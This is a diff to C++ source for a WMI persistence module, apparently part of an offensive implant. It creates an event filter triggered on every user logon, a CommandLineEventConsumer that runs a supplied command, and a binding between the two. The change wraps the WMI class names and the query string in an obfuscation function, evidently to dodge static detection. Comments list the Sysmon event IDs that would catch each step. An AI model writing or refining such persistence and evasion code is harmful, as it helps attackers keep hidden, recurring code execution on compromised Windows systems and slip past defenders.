@@ -1,4 +1,5 @@
 #include "WMIPersist.h"
+#include "Obf.h"
 #include <wbemidl.h>
 #pragma comment(lib, "wbemuuid.lib")
 
@@ -6,7 +7,8 @@ static HRESULT ConnectSubscription(IWbemLocator** ppLoc, IWbemServices** ppSvc) 
     HRESULT hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                    IID_IWbemLocator, (void**)ppLoc);
     if (FAILED(hr)) return hr;
-    hr = (*ppLoc)->ConnectServer((BSTR)L"ROOT\\subscription",
+    std::wstring wNs = SW(L"ROOT\\subscription");
+    hr = (*ppLoc)->ConnectServer((BSTR)wNs.c_str(),
                                  NULL, NULL, NULL, 0, NULL, NULL, ppSvc);
     if (FAILED(hr)) { (*ppLoc)->Release(); *ppLoc = nullptr; return hr; }
     CoSetProxyBlanket(*ppSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
@@ -40,7 +42,8 @@ std::string WMIPersist::Install(const std::string& name, const std::string& cmd)
     // ── 1. __EventFilter ─────────────────────────────────────────────────────
     // Detection: Sysmon EventID 19 — WmiEvent filter created with subscription query.
     IWbemClassObject* pFC = nullptr;
-    pSvc->GetObject((BSTR)L"__EventFilter", 0, NULL, &pFC, NULL);
+    std::wstring wEF = SW(L"__EventFilter");
+    pSvc->GetObject((BSTR)wEF.c_str(), 0, NULL, &pFC, NULL);
     IWbemClassObject* pF  = nullptr;
     if (pFC) { pFC->SpawnInstance(0, &pF); pFC->Release(); }
     if (!pF) {
@@ -54,9 +57,8 @@ std::string WMIPersist::Install(const std::string& name, const std::string& cmd)
     v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"WQL");
     pF->Put(L"QueryLanguage", 0, &v, 0); VariantClear(&v);
     // Fire on every new logon session creation (user logon event)
-    v.vt = VT_BSTR; v.bstrVal = SysAllocString(
-        L"SELECT * FROM __InstanceCreationEvent WITHIN 5 "
-        L"WHERE TargetInstance ISA 'Win32_LogonSession'");
+    { std::wstring wQ = SW(L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'");
+      v.vt = VT_BSTR; v.bstrVal = SysAllocString(wQ.c_str()); }
     pF->Put(L"Query", 0, &v, 0); VariantClear(&v);
     v.vt = VT_BSTR; v.bstrVal = SysAllocString(L"root\\cimv2");
     pF->Put(L"EventNameSpace", 0, &v, 0); VariantClear(&v);
@@ -73,7 +75,8 @@ std::string WMIPersist::Install(const std::string& name, const std::string& cmd)
     // ── 2. CommandLineEventConsumer ───────────────────────────────────────────
     // Detection: Sysmon EventID 20 — WmiEvent consumer with CommandLineTemplate.
     IWbemClassObject* pCC = nullptr;
-    pSvc->GetObject((BSTR)L"CommandLineEventConsumer", 0, NULL, &pCC, NULL);
+    std::wstring wCLC = SW(L"CommandLineEventConsumer");
+    pSvc->GetObject((BSTR)wCLC.c_str(), 0, NULL, &pCC, NULL);
     IWbemClassObject* pC  = nullptr;
     if (pCC) { pCC->SpawnInstance(0, &pC); pCC->Release(); }
     if (!pC) {
@@ -99,7 +102,8 @@ std::string WMIPersist::Install(const std::string& name, const std::string& cmd)
     // ── 3. __FilterToConsumerBinding ─────────────────────────────────────────
     // Detection: Sysmon EventID 21 — the binding object ties filter to consumer.
     IWbemClassObject* pBC = nullptr;
-    pSvc->GetObject((BSTR)L"__FilterToConsumerBinding", 0, NULL, &pBC, NULL);
+    std::wstring wFCB = SW(L"__FilterToConsumerBinding");
+    pSvc->GetObject((BSTR)wFCB.c_str(), 0, NULL, &pBC, NULL);
     IWbemClassObject* pB  = nullptr;
     if (pBC) { pBC->SpawnInstance(0, &pB); pBC->Release(); }
     if (!pB) {
